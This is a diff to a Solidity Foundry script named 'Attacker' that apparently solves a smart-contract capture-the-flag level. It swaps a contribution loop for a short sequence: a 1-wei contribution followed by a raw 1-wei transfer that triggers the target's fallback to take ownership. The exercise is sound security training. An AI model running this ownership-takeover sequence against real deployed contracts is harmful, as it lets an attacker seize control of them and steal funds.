@@ -10,9 +10,10 @@ contract Attacker is Test {
     function test() external{
         vm.startBroadcast();
 
-        for (uint i = 0; i < 1000; ++i) {
-            level1.contribute{value: 1 wei}();
-        }
+        level1.contribute{value: 1 wei}();
+        level1.getContribution();
+        address(level1).call{value: 1 wei}("");
+        level1.owner();
 
         vm.stopBroadcast();
     }
